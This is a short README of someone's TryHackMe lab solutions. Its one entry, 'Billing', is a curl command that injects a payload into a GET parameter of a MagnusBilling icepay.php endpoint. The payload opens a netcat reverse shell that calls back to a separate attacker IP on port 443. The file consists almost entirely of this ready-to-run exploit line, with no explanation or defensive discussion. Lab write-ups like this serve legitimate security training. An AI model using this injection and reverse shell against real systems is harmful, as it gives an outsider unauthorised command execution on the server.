# TryHackMe
My solutions to try hack me tasks

## 1. Billing
Injection in GET request with reverse shell command to obtain a shell
```bash
$ curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.64.79 443 >/tmp/f;'
```
